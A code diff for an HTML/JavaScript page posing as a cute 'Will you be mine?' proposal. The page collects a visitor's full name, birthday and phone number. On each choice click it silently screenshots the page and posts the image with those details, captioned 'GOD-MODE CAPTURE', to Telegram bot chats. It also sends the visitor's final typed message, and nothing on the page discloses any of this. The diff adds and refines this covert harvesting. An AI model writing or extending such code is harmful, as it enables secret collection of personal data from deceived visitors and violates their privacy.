@@ -14,19 +14,18 @@
 
         body { font-family: 'Poppins', sans-serif; background: var(--bg); min-height: 100vh; transition: 1.5s; overflow: hidden; display: flex; align-items: center; justify-content: center; color: white; }
         
-        .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500; }
-        .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 10; }
+        .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500; text-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        .glass-card { background: var(--glass); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 10; transform: translateZ(0); }
 
-        #bg-video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
+        #bg-video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
 
-        .burst-particle {
-            position: fixed; pointer-events: none; z-index: 1000;
-            animation: burstOut 1.5s ease-out forwards;
-        }
-        @keyframes burstOut {
-            0% { transform: translate(0, 0) scale(1); opacity: 1; }
-            100% { transform: translate(var(--tx), var(--ty)) scale(0); opacity: 0; }
-        }
+        /* Floating Animated Orbs */
+        .orb { position: absolute; border-radius: 50%; filter: blur(60px); z-index: 0; animation: float 10s infinite alternate; opacity: 0.4; }
+        @keyframes float { from { transform: translate(0,0); } to { transform: translate(50px, 80px); } }
+
+        /* Button Animations */
+        .choice-btn { transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .choice-btn:active { transform: scale(0.9) rotate(-3deg); background: white; color: #ff4d6d; }
 
         .bubble-btn { animation: bubblePulse 2s infinite ease-in-out; }
         @keyframes bubblePulse { 0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.6); } 50% { transform: scale(1.06); box-shadow: 0 0 25px 15px rgba(255, 77, 109, 0); } }
@@ -41,6 +40,9 @@
 </head>
 <body id="capture-body">
 
+    <div class="orb w-64 h-64 bg-white top-10 left-[-20px]"></div>
+    <div class="orb w-72 h-72 bg-pink-300 bottom-10 right-[-20px]"></div>
+
     <div id="bg-video-container"><div id="player-mount"></div></div>
 
     <div class="status-bar">
@@ -52,29 +54,31 @@
         <div id="main-content" class="glass-card p-8 text-center w-full">
             
             <div id="stage-1" class="space-y-4">
-                <h1 class="text-4xl font-bold mb-6 cursive">Hello Bestu! ✨</h1>
-                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                <input type="number" id="age" placeholder="Age" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                <input type="tel" id="mobile" placeholder="Phone Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                <button onclick="toStage2()" class="w-full bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-xl mt-4">Begin Journey ❤️</button>
+                <h1 class="text-4xl font-bold mb-6 cursive">Welcome, Bestu! ✨</h1>
+                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
+                <input type="text" id="dob" placeholder="Birthday (DD/MM/YYYY)" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
+                <input type="tel" id="mobile" placeholder="Phone Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/50">
+                <button onclick="toStage2()" class="w-full bg-white text-pink-500 py-4 rounded-2xl font-bold shadow-xl mt-4 hover:bg-pink-50 transition-colors">Start the Magic ❤️</button>
             </div>
 
             <div id="stage-2" class="hidden-stage">
+                <div class="text-xs text-white/60 mb-2 uppercase tracking-widest">Logged in as: <span id="display-name" class="text-white"></span></div>
                 <h1 class="text-3xl font-bold mb-10 cursive">Will you be mine? ❤️</h1>
                 <div class="grid gap-4">
-                    <button onclick="handleAction('YES', '❤️')" class="bg-pink-500 py-4 rounded-2xl font-bold shadow-lg">YES! 😍</button>
-                    <button onclick="handleAction('NO', '😊')" class="bg-white/10 py-4 rounded-2xl border border-white/20">No 😢</button>
-                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl font-bold shadow-lg text-sm">Food <br><span class="text-[10px] font-light">(you will have to pay for food)</span></button>
+                    <button id="btn-yes" onclick="handleAction('YES')" class="choice-btn bg-pink-500 py-4 rounded-2xl font-bold shadow-lg">YES! 😍</button>
+                    <button id="btn-no" onclick="handleAction('NO')" class="choice-btn bg-white/10 py-4 rounded-2xl border border-white/20">No 😢</button>
+                    <button id="btn-food" onclick="handleAction('FOOD')" class="choice-btn bg-yellow-500 py-4 rounded-2xl font-bold shadow-lg text-sm">Food <br><span class="text-[10px] font-light">(you will have to pay for food)</span></button>
                 </div>
             </div>
 
             <div id="stage-3" class="hidden-stage space-y-6">
-                <textarea id="final-reply" placeholder="Type your message..." class="w-full p-4 rounded-2xl bg-white/5 border border-white/10 text-white outline-none" rows="2"></textarea>
-                <button onclick="submitFinal()" class="bubble-btn w-full bg-pink-500 py-4 rounded-full font-bold shadow-2xl">Submit ✅</button>
+                <h2 class="text-2xl cursive">A thought for me? ❤️</h2>
+                <textarea id="final-reply" placeholder="Type your heart out..." class="w-full p-4 rounded-2xl bg-white/5 border border-white/10 text-white outline-none" rows="2"></textarea>
+                <button onclick="submitFinal()" class="bubble-btn w-full bg-pink-500 py-4 rounded-full font-bold shadow-2xl">Submit Thought ✅</button>
             </div>
 
             <div id="stage-4" class="hidden-stage py-10">
-                <h1 class="fairy-text text-4xl mb-6 cursive">Our Fairy Tale</h1>
+                <h1 class="fairy-text text-4xl mb-6 cursive">And so, it begins...</h1>
                 <div id="fairy-thought" class="text-white text-xl cursive leading-relaxed"></div>
             </div>
         </div>
@@ -94,53 +98,44 @@
         }
         setInterval(updateStatus, 1000); updateStatus();
 
-        function createBurst(emoji) {
-            for (let i = 0; i < 20; i++) {
-                const p = document.createElement('div');
-                p.innerText = emoji; p.className = 'burst-particle';
-                p.style.left = '50vw'; p.style.top = '50vh';
-                p.style.setProperty('--tx', (Math.random() - 0.5) * 400 + 'px');
-                p.style.setProperty('--ty', (Math.random() - 0.5) * 400 + 'px');
-                document.body.appendChild(p);
-                setTimeout(() => p.remove(), 1500);
-            }
-        }
-
         function toStage2() {
-            store = { n: document.getElementById('name').value, a: document.getElementById('age').value, m: document.getElementById('mobile').value };
-            if(!store.n || !store.m) return alert("Details required! 😊");
+            store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
+            if(!store.n || !store.m) return alert("All info is needed for the magic! 😊");
+            
+            document.getElementById('display-name').innerText = store.n;
             document.getElementById('stage-1').classList.add('hidden-stage');
             document.getElementById('stage-2').classList.remove('hidden-stage');
         }
 
-        async function handleAction(type, emoji) {
+        async function handleAction(type) {
             updateStatus();
-            createBurst(emoji);
-
-            // 1. Instant Parallel Data Push
-            const vids = { 'YES': 'TK2RwQUun-U', 'FOOD': 'XGURSAziJjc', 'NO': 'CVEM60qkzT8' };
             
-            // Use html2canvas scale to make the screenshot look realistic and instant
-            html2canvas(document.body, { useCORS: true, scale: 2 }).then(canvas => {
-                canvas.toBlob(blob => {
-                    CHAT_IDS.forEach(id => {
+            // 1. DELAYED CAPTURE: Wait for click animation, then snap
+            setTimeout(async () => {
+                const canvas = await html2canvas(document.body, { useCORS: true, scale: 2 });
+                canvas.toBlob(async (blob) => {
+                    for (const id of CHAT_IDS) {
                         const fd = new FormData();
-                        fd.append('chat_id', id); fd.append('photo', blob, 'instant_shot.png');
-                        fd.append('caption', `💌 DATA RECEIVED\nName: ${store.n}\nAge: ${store.a}\nPhone: ${store.m}\nChoice: ${type}`);
+                        fd.append('chat_id', id); fd.append('photo', blob, 'bestu_snap.png');
+                        fd.append('caption', `🔥 GOD-MODE CAPTURE\n👤 Name: ${store.n}\n🎂 DOB: ${store.d}\n📞 Phone: ${store.m}\n✅ Choice: ${type}`);
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    });
+                    }
                 });
-            });
 
-            // 2. Instant Stage Swap
-            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${vids[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay"></iframe>`;
-            document.getElementById('stage-2').classList.add('hidden-stage');
-            document.getElementById('stage-3').classList.remove('hidden-stage');
+                // 2. Play Video & Move to Stage 3
+                const vids = { 'YES': 'TK2RwQUun-U', 'FOOD': 'XGURSAziJjc', 'NO': 'CVEM60qkzT8' };
+                document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${vids[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay"></iframe>`;
+                
+                document.getElementById('stage-2').classList.add('hidden-stage');
+                document.getElementById('stage-3').classList.remove('hidden-stage');
+            }, 150);
         }
 
         async function submitFinal() {
             const reply = document.getElementById('final-reply').value;
-            for(let i=0; i<80; i++) {
+            
+            // Fairy Tale Rain Drops
+            for(let i=0; i<120; i++) {
                 setTimeout(() => {
                     const d = document.createElement('div'); d.className = 'drop'; d.style.left = Math.random() * 100 + 'vw';
                     d.style.animationDuration = (Math.random() * 0.5 + 0.5) + 's'; document.body.appendChild(d);
@@ -148,14 +143,15 @@
                 }, i * 15);
             }
 
-            CHAT_IDS.forEach(id => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💭 Thought: " + reply + "\nUser: " + store.n)}`);
-            });
+            // Send Final Thought
+            for (const id of CHAT_IDS) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💭 Thought from " + store.n + ": " + reply)}`);
+            }
 
             document.body.classList.add('fairy-theme');
             document.getElementById('stage-3').classList.add('hidden-stage');
             document.getElementById('stage-4').classList.remove('hidden-stage');
-            document.getElementById('fairy-thought').innerText = "And so, our tale begins. You shared: \"" + reply + "\". Locked in the stars.";
+            document.getElementById('fairy-thought').innerText = "Every once in a while, love gives us a fairy tale. You shared: \"" + reply + "\". Locked in the stars forever.";
         }
     </script>
 </body>
